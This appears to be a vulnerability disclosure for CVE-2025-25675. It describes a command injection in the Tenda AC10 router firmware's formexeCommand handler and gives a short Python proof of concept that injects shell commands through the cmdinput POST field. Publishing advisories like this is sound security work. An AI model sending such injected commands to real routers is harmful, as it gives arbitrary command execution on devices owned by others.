# CVE-2025-25675

## Overview

- Firmware download website: https://www.tenda.com.cn/material/show/102734

## Affected version

**AC10V1.0V15.03.06.23**

## **Vulnerability details**

The Tenda AC10V1.0V15.03.06.23 has a command injection vulnerablility located in the formexeCommand function. The str variable receives the cmdinput parameter from a POST request and is later assigned to the cmd_buf variable, which is directly used in the doSystemCmd function, causing an arbitrary command execution. The user-provided cmdinput can trigger this security vulnerability

![img](https://s2.loli.net/2025/02/15/J7GndQBPftMOVTi.png)

## **PoC**

```python
import requests

ip = '192.168.2.1:80'

url = f"http://{ip}/goform/exeCommand"

data = {'cmdinput':'echo \\'hack!!!\\';ls;'}

ret = requests.post(url, data)
```